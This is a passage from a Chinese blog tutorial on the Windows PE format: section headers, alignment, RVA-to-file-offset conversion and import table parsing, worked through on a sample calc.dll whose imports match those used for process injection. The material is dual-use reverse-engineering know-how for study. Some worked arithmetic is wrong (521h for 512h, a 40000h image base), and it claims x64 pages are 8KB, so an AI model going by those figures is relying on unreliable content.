<span class="hljs-comment">// 磁盘文件中区块起始位置</span><br>  DWORD PointerToRelocations;   <span class="hljs-comment">// 在 OBJ 文件中使用，重定位的偏移</span><br>  DWORD PointerToLinenumbers;   <span class="hljs-comment">// 行号表的偏移(供调试使用)</span><br>  WORD  NumberOfRelocations;    <span class="hljs-comment">// 在 OBJ 文件中使用，重定位项数目</span><br>  WORD  NumberOfLinenumbers;    <span class="hljs-comment">// 行号表中行号的数目</span><br>  DWORD Characteristics;        <span class="hljs-comment">// 区块属性</span><br>&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;<br></code></pre></div></td></tr></table></figure><br/><p>块名：<code>.text</code>、<code>.rdata</code> 、<code>.data</code>、<code>.reloc</code>, <code>.</code> 不是必须的</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">000001c0</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">2</span>e<span class="hljs-number">74</span> <span class="hljs-number">6578</span> <span class="hljs-number">7400</span> <span class="hljs-number">0000</span>  .........text...<br><span class="hljs-attribute">000001d0</span>: <span class="hljs-number">5201</span> <span class="hljs-number">0000</span> <span class="hljs-number">0010</span> <span class="hljs-number">0000</span> <span class="hljs-number">0002</span> <span class="hljs-number">0000</span> <span class="hljs-number">0004</span> <span class="hljs-number">0000</span>  R...............<br><span class="hljs-attribute">000001e0</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">2000</span> <span class="hljs-number">0060</span>  ............ ..`<br><span class="hljs-attribute">000001f0</span>: <span class="hljs-number">2</span>e<span class="hljs-number">72</span> <span class="hljs-number">6461</span> <span class="hljs-number">7461</span> <span class="hljs-number">0000</span> <span class="hljs-number">0</span>c<span class="hljs-number">01</span> <span class="hljs-number">0000</span> <span class="hljs-number">0020</span> <span class="hljs-number">0000</span>  .rdata....... ..<br><span class="hljs-attribute">00000200</span>: <span class="hljs-number">0002</span> <span class="hljs-number">0000</span> <span class="hljs-number">0006</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>  ................<br><span class="hljs-attribute">00000210</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">4000</span> <span class="hljs-number">0040</span> <span class="hljs-number">2</span>e<span class="hljs-number">64</span> <span class="hljs-number">6174</span> <span class="hljs-number">6100</span> <span class="hljs-number">0000</span>  ....@..@.data...<br><span class="hljs-attribute">00000220</span>: <span class="hljs-number">0</span>d<span class="hljs-number">08</span> <span class="hljs-number">0000</span> <span class="hljs-number">0030</span> <span class="hljs-number">0000</span> <span class="hljs-number">000</span>a <span class="hljs-number">0000</span> <span class="hljs-number">0008</span> <span class="hljs-number">0000</span>  .....<span class="hljs-number">0</span>..........<br><span class="hljs-attribute">00000230</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">4000</span> <span class="hljs-number">00</span>c<span class="hljs-number">0</span>  ............@...<br><span class="hljs-attribute">00000240</span>: <span class="hljs-number">2</span>e<span class="hljs-number">72</span> <span class="hljs-number">656</span>c <span class="hljs-number">6</span>f<span class="hljs-number">63</span> <span class="hljs-number">0000</span> <span class="hljs-number">2000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0040</span> <span class="hljs-number">0000</span>  .reloc.. ....@..<br><span class="hljs-attribute">00000250</span>: <span class="hljs-number">0002</span> <span class="hljs-number">0000</span> <span class="hljs-number">0012</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>  ................<br><span class="hljs-attribute">00000260</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">4000</span> <span class="hljs-number">0042</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>  ....@..B........<br><span class="hljs-attribute">00000270</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>  ................<br></code></pre></div></td></tr></table></figure><br/><p>常见区块：</p><ul><li>.text  : 默认代码区块</li><li>.data  : 默认读/写数据区块，全局变量、静态变量一般放在这里</li><li>.rdata : 默认只读数据区块，程序很少用到该块中的数据</li><li>.idata : 包含其他外来 DLL 的函数及数据信息，及输入表，经常合并到另一个区块，如: .rdata 区块</li><li>.edata : 输出表</li><li>.bss   : 未初始化数据，很少使用</li><li>.tls   : 线程局部存储器</li><li>.reloc : 可执行文件的基址重定位，一般只是 DLL 需要</li></ul><br/><p>创建和重命名自己的区块</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> data_seg(<span class="hljs-meta-string">&quot;MY_DATA&quot;</span>)</span><br></code></pre></div></td></tr></table></figure><p>此时，所以被 Visual C++处理的数据都将放在一个叫 <code>MY_DATA</code> 的区块内，而不是默认的 <code>.data</code> 区块</p><br/><p><code>objdump -M intel -h calc.dll</code></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Sections</span>:<br><span class="hljs-attribute">Idx</span> Name          Size      VMA       LMA       File <span class="hljs-literal">off</span>  Algn<br>  <span class="hljs-attribute">0</span> .text         <span class="hljs-number">00000152</span>  <span class="hljs-number">10001000</span>  <span class="hljs-number">10001000</span>  <span class="hljs-number">00000400</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">CONTENTS</span>, ALLOC, LOAD, READONLY, CODE<br>  <span class="hljs-attribute">1</span> .rdata        <span class="hljs-number">0000010</span>c  <span class="hljs-number">10002000</span>  <span class="hljs-number">10002000</span>  <span class="hljs-number">00000600</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">CONTENTS</span>, ALLOC, LOAD, READONLY, DATA<br>  <span class="hljs-attribute">2</span> .data         <span class="hljs-number">0000080</span>d  <span class="hljs-number">10003000</span>  <span class="hljs-number">10003000</span>  <span class="hljs-number">00000800</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">CONTENTS</span>, ALLOC, LOAD, DATA<br>  <span class="hljs-attribute">3</span> .reloc        <span class="hljs-number">00000020</span>  <span class="hljs-number">10004000</span>  <span class="hljs-number">10004000</span>  <span class="hljs-number">00001200</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">CONTENTS</span>, ALLOC, LOAD, READONLY, DATA<br></code></pre></div></td></tr></table></figure><blockquote><p><strong>NOTE:</strong> 为加载到内存中的 PE 文件为 PE 文件，加载到内存中的形态被称为 <em>映像(image)</em></p></blockquote><br/><h3 id="区块对齐值"><a href="#区块对齐值" class="headerlink" title="区块对齐值"></a>区块对齐值</h3><p>有两种对其值，一种用于磁盘文件内，另一种用于内存中</p><p>在 PE文件头里，<code>FileAlignment</code>定义了磁盘区块的对齐值。每个区块从对齐值的<strong>倍数</strong>的偏移位置开始，区块的实际代码或数据不一定刚好这么多，所以在不足的地方一般以 <code>00h</code> 来填充，这就是区块的 <strong>间隙</strong></p><br/><p>例如，一个 PE文件的对其值是 200h，这样每个区块从 200h的倍数的文件偏移位置开始。</p><p>假如区块的第一个节在 400h 处，长度为 90h，那么 400h～490h为这一区块的内容，而文件对其值为 200h，那么 490～600h会被 0 填充，这段空间称为区块间隙，下一个区块的开始地址为 600h</p><br/><p><code>objdump -M intel -x calc.dll</code></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">SectionAlignment</span><span class="hljs-number">00001000</span><br><span class="hljs-attribute">FileAlignment</span><span class="hljs-number">00000200</span><br></code></pre></div></td></tr></table></figure><br/><p>在 PE文件头里，<code>SectionAlignment</code>定义了内存中区块的对齐值，当 PE文件被映射到内存中时，区块总是至少从一个页边界处开始。也就是说，当一个 PE文件被映射到内存中时，每个区块的第 1 个字节对应于某个内存页</p><p>在 x86 系列CPU中，内存页是按 4KB(1000h)排列的<br>在 x64 中，内存页是按照 8KB(2000h)排列的</p><p>所以，在 x86系统中，PE文件区块的内存对齐值一般为 1000h，每个区块从 1000h的倍数的内存偏移开始</p><br/><p>例如，.text区块在磁盘文件中的偏移为 400h，在内存中将其载入 1000h字节处；.rdata 区块在磁盘文件偏移的 600h处，在内存中将被载入地址之上的 2000h字节处</p><br/><h3 id="文件偏移与虚拟地址转换"><a href="#文件偏移与虚拟地址转换" class="headerlink" title="文件偏移与虚拟地址转换"></a>文件偏移与虚拟地址转换</h3><p>在同一区块中，各地址偏移量是相等的，可用下面的公式对区块中的任意 File Offset 与 VA 进行转换。注意，不同区块在磁盘与内存中的差值不同</p><p>文件被映射到内存时，MS-DOS头、PE文件头和块表的偏移位置与大小均不会变，而各地区块被映射到内存后，其偏移位置会发生变化</p><figure class="highlight excel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs excel"><span class="hljs-built_in">Offset</span> = RVA - ∆k<br>FIle <span class="hljs-built_in">Offset</span> = VA - ImageBase - ∆k<br><br>FIle <span class="hljs-built_in">Offset</span> = VA - ImageBase - (RVA - Section.Raw <span class="hljs-built_in">Offset</span>)<br></code></pre></div></td></tr></table></figure><br/><table><thead><tr><th>区块</th><th>虚拟偏移量(RVA)</th><th>文件偏移量(Raw Offset)</th><th>差值(∆k)</th></tr></thead><tbody><tr><td>.text</td><td>1000h</td><td>400h</td><td>0C00h</td></tr><tr><td>.rdata</td><td>2000h</td><td>600h</td><td>1A00h</td></tr><tr><td>.data</td><td>3000h</td><td>800h</td><td>2800h</td></tr></tbody></table><p>∆k = 虚拟偏移量 - 文件偏移量</p><figure class="highlight coq"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coq">∆k = RVA - <span class="hljs-keyword">Section</span>.Raw Offset<br></code></pre></div></td></tr></table></figure><br/><p>例如，某一虚拟地址(VA) 为 401112h(基地址: 400000h), 要计算它的文件偏移地址。</p><p>401112h 在 .text块中，此时 ∆k = 0C00h，故</p><p>File Offset = VA - ImageBase - ∆k = 401112h - 40000h - C00h = 521h</p><p>若虚拟内存地址为 4020D2h</p><p>File Offset = VA -ImageBase - ∆k = 4020D2h - 40000h - 1A00h = 6D2h</p><br/><h2 id="输入表-IAT"><a href="#输入表-IAT" class="headerlink" title="输入表/IAT"></a>输入表/IAT</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">There</span> is an import table in .rdata at <span class="hljs-number">0</span>x<span class="hljs-number">10002024</span><br><br><span class="hljs-attribute">The</span> Import Tables (interpreted .rdata section contents)<br> <span class="hljs-attribute">vma</span>:            Hint    Time      Forward  DLL       First<br>                 <span class="hljs-attribute">Table</span>   Stamp     Chain    Name      Thunk<br> <span class="hljs-attribute">00002024</span><span class="hljs-number">0000204</span>c <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">000020</span>fe <span class="hljs-number">00002000</span><br><br><span class="hljs-attribute">DLL</span> Name: KERNEL<span class="hljs-number">32</span>.dll<br><span class="hljs-attribute">vma</span>:  Hint/Ord Member-Name Bound-To<br><span class="hljs-attribute">2070</span>  <span class="hljs-number">127</span>  CloseHandle<br><span class="hljs-attribute">207e</span>  <span class="hljs-number">338</span>  ExitThread<br><span class="hljs-attribute">208c</span> <span class="hljs-number">1191</span>  ResumeThread<br><span class="hljs-attribute">209c</span>  <span class="hljs-number">215</span>  CreateProcessA<br><span class="hljs-attribute">20ae</span>  <span class="hljs-number">740</span>  GetThreadContext<br><span class="hljs-attribute">20c2</span> <span class="hljs-number">1322</span>  SetThreadContext<br><span class="hljs-attribute">20d6</span> <span class="hljs-number">1434</span>  VirtualAllocEx<br><span class="hljs-attribute">20e8</span> <span class="hljs-number">1512</span>  WriteProcessMemory<br><br> <span class="hljs-attribute">00002038</span><span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br></code></pre></div></td></tr></table></figure><p>可执行文件使用来自其他 DLL的代码或数据的动作称为输入</p><p>输入函数：被程序调用但其执行代码不再程序中的函数</p><p>在 PE文件内有一组数据结构，他们分别对应于被输入的 DLL。每一个这样的结构都给出了被输入的 DLL 的名称并指向一组函数指针。这组函数指针被称为 <strong>输入地址表</strong>。每一个被引入的 API 在 IAT里有都保留的位置，在哪里它将被 Windows加载器写入输入函数的地址。一旦模块被载入，IAT中将包含所要调用输入函数的地址</p><p>导出函数修饰符</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">__declspec(dllimport) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br></code></pre></div></td></tr></table></figure><br/><h3 id="输入表的结构"><a href="#输入表的结构" class="headerlink" title="输入表的结构"></a>输入表的结构</h3><p>PE文件头的可选映像头，数据目录表的第二个成员指向输入表，以一个 <code>IMAGE_IMPORT_DESCRIPTOR</code>(IID)数组开始。每个被 PE文件隐式链接的 DLL都有一个 IID</p><p><strong>IID用来描述被引入的 DLL文件</strong></p><br/><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>DWORD Characteristics;<br>DWORD OriginalFirstThunk;<br>&#125;;<br>DWORD TimeDateStamp;<br>DWORD ForwarderChain;<br>DWORD Name;<br>DWORD FirstThunk;<br>&#125; IMAGE_IMPORT_DESCRIPTOR;<br></code></pre></div></td></tr></table></figure><ul><li>OriginalFirstThunk: 包含指向 **输入名称表(INT)**的地址(RVA)，以 0/NULL 结束</li><li>Name: 库名称字符串的地址(RVA)，该字符串包含输入 DLL 的名称(例如：USER32.DLL)</li><li>FirstThunk: 包含指向 **输入地址表(IAT)**的地址(RVA)，是一个 <code>IMAGE_THUNK_DATA</code>结构的数组，以 0/NULL 结束</li></ul><br/><p>INT是一个指向 <code>IMAGE_THUNK_DATA</code> 结构的数组，数组中的每个 <code>IMAGE_THUNK_DATA</code>结构都指向 <code>IMAGE_IMPORT_BY_NAME</code> 结构</p><br/><figure class="highlight elm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elm">                                                        <span class="hljs-type">INT</span>     <span class="hljs-type">IMAGE_IMPORT_BY_NAME</span>    <span class="hljs-type">IAT</span><br>                                                        <br>                                               -&gt; <span class="hljs-type">IMAGE_THUNK_DATA</span> -&gt; <span class="hljs-number">01</span>[函数<span class="hljs-number">1</span>] &lt;- <span class="hljs-type">IMAGE_THUNK_DATA</span> &lt;-|<br>                        |-&gt; <span class="hljs-type">OriginalFirstThunk</span> -&gt; <span class="hljs-type">IMAGE_THUNK_DATA</span> -&gt; n[函数n]  &lt;- <span class="hljs-type">IMAGE_THUNK_DATA</span> &lt;-|<br>                        |                      -&gt; <span class="hljs-number">0</span> (结束)                                            |<br><span class="hljs-type">IMAGE_IMPORT_DESCRIPTOR</span> |-&gt; <span class="hljs-type">TimeDateStamp</span>                                                             |<br>                        |-&gt; <span class="hljs-type">ForwarderChain</span>                                                            |<br>                        |-&gt; <span class="hljs-type">Name</span>                -&gt; <span class="hljs-string">&quot;USER32.DLL&quot;</span>                                       |<br>                        |-&gt; <span class="hljs-type">FirstThunk</span> <span class="hljs-comment">---------------------------------------------------------------|</span><br><br></code></pre></div></td></tr></table></figure><br/><p><code>IMAGE_THUNK_DATA</code>结构：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">IMAGE_THUNK_DATA STRUCT<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">u1</span></span><br><span class="hljs-class">        <span class="hljs-title">ForwarderString</span>     <span class="hljs-title">DWORD</span>   // 指向一个转向者字符串的<span class="hljs-title">RVA</span></span><br><span class="hljs-class">        <span class="hljs-title">Function</span>            <span class="hljs-title">DWORD</span>   // 被输入的函数的内存地址</span><br><span class="hljs-class">        <span class="hljs-title">Ordinal</span>             <span class="hljs-title">DWORD</span>   // 被输入的 <span class="hljs-title">API</span> 的序数值</span><br><span class="hljs-class">        <span class="hljs-title">AddressOdData</span>       <span class="hljs-title">DWORD</span>   // 指向 <span class="hljs-title">IMAGE_IMPORT_BY_NAME</span></span><br><span class="hljs-class">    <span class="hljs-title">ends</span></span><br><span class="hljs-class"><span class="hljs-title">IMAGE_THUNK_DATA</span> <span class="hljs-title">ENDS</span></span><br></code></pre></div></td></tr></table></figure><br/><p><code>IMAGE_IMPORT_BY_NAME</code>结构：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">IMAGE_IMPORT_BY_NAME STRUCT<br>    Hint        WORD    <span class="hljs-comment">// 本函数在其所驻留 DLL的输出表中的序号</span><br>    Name        BYTE    <span class="hljs-comment">// 输入函数的函数名, NULL 结尾</span><br>IMAGE_IMPORT_BY_NAME ENDS<br></code></pre></div></td></tr></table></figure><br/><h3 id="输入地址表"><a href="#输入地址表" class="headerlink" title="输入地址表"></a>输入地址表</h3><p>Q: 为什么会有两个并行的指针数组指向 <code>IMAGE_IMPORT_BY_NAME</code>结构？</p><p>A: 因为 <code>OriginalFirstThunk</code> 是单独的一项，不可改写，称为 INT；<code>FirstThunk</code>是有 <strong>PE装载器</strong>重写的。PE装载器先搜索 OriginalFirstThunk ，如果找到，加载器就迭代搜索数组中的每个指针，找出每个 <code>IMAGE_IMPORT_BY_NAME</code>结构所指向的输入函数的地址(Function)。然后，加载器用函数真正的入口地址来替代由 FirstThunk 指向的 <code>IMAGE_THUNK_DATA</code> 数组里元素的值</p><figure class="highlight elm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elm">                                                        <span class="hljs-type">INT</span>     <span class="hljs-type">IMAGE_IMPORT_BY_NAME</span>    <span class="hljs-type">IAT</span><br>                                                        <br>                                               -&gt; <span class="hljs-type">IMAGE_THUNK_DATA</span> -&gt; <span class="hljs-number">01</span>[函数<span class="hljs-number">1</span>] &lt;- [函数 <span class="hljs-number">1</span> 的地址]  &lt;-|<br>                        |-&gt; <span class="hljs-type">OriginalFirstThunk</span> -&gt; <span class="hljs-type">IMAGE_THUNK_DATA</span> -&gt; n[函数n]  &lt;- [函数 n 的地址]  &lt;-|<br>                        |                      -&gt; <span class="hljs-number">0</span> (结束)                                            |<br><span class="hljs-type">IMAGE_IMPORT_DESCRIPTOR</span> |-&gt; <span class="hljs-type">TimeDateStamp</span>                                                             |<br>                        |-&gt; <span class="hljs-type">ForwarderChain</span>                                                            |<br>                        |-&gt; <span class="hljs-type">Name</span>                -&gt; <span class="hljs-string">&quot;USER32.DLL&quot;</span>                                       |<br>                        |-&gt; <span class="hljs-type">FirstThunk</span> <span class="hljs-comment">---------------------------------------------------------------|</span><br><br></code></pre></div></td></tr></table></figure><p><em>在某些情况下，一些函数仅由序号引出</em></p><br/><p>确定数据目录表 (DataDirectory) 的第二个成员的位置(指向输入表)</p><p>该指针在 PE文件头的 80h 偏移处，需要找到 PE文件头的起始位置</p><p>PE文件头的起始位置在 DOS 头的 <code>e_lfanew</code> 处得到</p><p>例：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">SectionAlignment</span><span class="hljs-number">00001000</span><br><span class="hljs-attribute">FileAlignment</span><span class="hljs-number">00000200</span><br><br><br><span class="hljs-attribute">Sections</span>:<br><span class="hljs-attribute">Idx</span> Name          Size      VMA       LMA       File <span class="hljs-literal">off</span>  Algn<br>  <span class="hljs-attribute">0</span> .text         <span class="hljs-number">00000152</span>  <span class="hljs-number">10001000</span>  <span class="hljs-number">10001000</span>  <span class="hljs-number">00000400</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">CONTENTS</span>, ALLOC, LOAD, READONLY, CODE<br>  <span class="hljs-attribute">1</span> .rdata        <span class="hljs-number">0000010</span>c  <span class="hljs-number">10002000</span>  <span class="hljs-number">10002000</span>  <span class="hljs-number">00000600</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">CONTENTS</span>, ALLOC, LOAD, READONLY, DATA<br>  <span class="hljs-attribute">2</span> .data         <span class="hljs-number">0000080</span>d  <span class="hljs-number">10003000</span>  <span class="hljs-number">10003000</span>  <span class="hljs-number">00000800</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">CONTENTS</span>, ALLOC, LOAD, DATA<br>  <span class="hljs-attribute">3</span> .reloc        <span class="hljs-number">00000020</span>  <span class="hljs-number">10004000</span>  <span class="hljs-number">10004000</span>  <span class="hljs-number">00001200</span>  <span class="hljs-number">2</span>**<span class="hljs-number">2</span><br>                  <span class="hljs-attribute">CONTENTS</span>, ALLOC, LOAD, READONLY, DATA<br></code></pre></div></td></tr></table></figure><p>PE头起始位置:<br>e_lfanew: 000000d0</p><p>数据目录表的第二个成员位置(0x01):<br>D0h + 80h = 150h</p><p>输入表的 RVA:<br>00000150: 2420 0000 : 0x2024 (RVA)</p><p>磁盘文件偏移:<br>2024h 位于 .rdata<br>∆k = 2000h - 600h = 1A00h</p><p>File Offset = RVA - ∆k = 2024h - 1A00h = 624h</p><p>输入表(IID)位置：624h</p><br/><p>xxd -s 0x624 -l 0x20 calc.dll</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00000624</span>: <span class="hljs-number">4</span>c<span class="hljs-number">20</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> fe<span class="hljs-number">20</span> <span class="hljs-number">0000</span>  L ........... ..<br><span class="hljs-attribute">00000634</span>: <span class="hljs-number">0020</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>  . ..............<br></code></pre></div></td></tr></table></figure><p>objdump -x calc.dll</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">vma</span>:            Hint    Time      Forward  DLL       First<br>                <span class="hljs-attribute">Table</span>   Stamp     Chain    Name      Thunk<br><span class="hljs-attribute">00002024</span><span class="hljs-number">0000204</span>c <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">000020</span>fe <span class="hljs-number">00002000</span><br></code></pre></div></td></tr></table></figure><p> 第四个字段(DLL Name) 是 20FEh(RVA)，将它减去 1A00h = 6FE<br> 查看此处数据：</p><p>xxd -s 0x6fe -l 0x10 calc.dll</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">000006fe</span>: <span class="hljs-number">4</span>b<span class="hljs-number">45</span> <span class="hljs-number">524</span>e <span class="hljs-number">454</span>c <span class="hljs-number">3332</span> <span class="hljs-number">2</span>e<span class="hljs-number">64</span> <span class="hljs-number">6</span>c<span class="hljs-number">6</span>c <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>  KERNEL<span class="hljs-number">32</span>.dll....<br></code></pre></div></td></tr></table></figure><p>查看 <code>IMAGE_THUNK_DATA</code>:<br>OriginalFirstThunk (204C RVA) 处的数据 204Ch - 1A00h = 64C</p><p>xxd -s 0x64C -l 0x20 calc.dll</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">0000064c</span>: <span class="hljs-number">7020</span> <span class="hljs-number">0000</span> <span class="hljs-number">7</span>e<span class="hljs-number">20</span> <span class="hljs-number">0000</span> <span class="hljs-number">8</span>c<span class="hljs-number">20</span> <span class="hljs-number">0000</span> <span class="hljs-number">9</span>c<span class="hljs-number">20</span> <span class="hljs-number">0000</span>  p ..~ ... ... ..<br><span class="hljs-attribute">0000065c</span>: ae<span class="hljs-number">20</span> <span class="hljs-number">0000</span> c<span class="hljs-number">220</span> <span class="hljs-number">0000</span> d<span class="hljs-number">620</span> <span class="hljs-number">0000</span> e<span class="hljs-number">820</span> <span class="hljs-number">0000</span>  . ... ... ... ..<br></code></pre></div></td></tr></table></figure><p>一共有 8 个 IMAGE_THUNK_DATA 结构，也就是 8 个导入函数<br>第一个函数: 2070h - 1A00h = 670h</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00000670</span>: <span class="hljs-number">7</span>f<span class="hljs-number">00</span> <span class="hljs-number">436</span>c <span class="hljs-number">6</span>f<span class="hljs-number">73</span> <span class="hljs-number">6548</span> <span class="hljs-number">616</span>e <span class="hljs-number">646</span>c <span class="hljs-number">6500</span> <span 